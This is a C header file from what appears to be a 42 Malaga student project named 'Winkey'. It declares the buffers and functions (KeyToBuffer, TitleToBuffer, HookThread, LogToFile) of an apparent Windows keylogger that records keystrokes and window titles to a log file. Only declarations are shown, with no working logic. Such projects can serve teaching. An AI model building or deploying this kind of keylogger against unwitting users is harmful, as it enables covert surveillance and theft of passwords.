/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   winkey.h                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 16:21:25 by vzurera-          #+#    #+#             */
/*   Updated: 2025/05/15 18:22:55 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#pragma region "Includes"

	#include <windows.h>

#pragma endregion

#pragma region "Variables"

	#define NAME		"Winkey"
	#define VERSION		"1.0.0"
	#define BUFFER_SIZE	254

	extern char			g_LogPath[MAX_PATH];
	extern char			g_Buffer[BUFFER_SIZE + 1];
	extern size_t		g_BufferLen;

#pragma endregion

#pragma region "Methods"

	void LogToFile(void);
	void KeyToBuffer(const char *key);
	void TitleToBuffer(const char *title);
	DWORD WINAPI HookThread(LPVOID param);

#pragma endregion
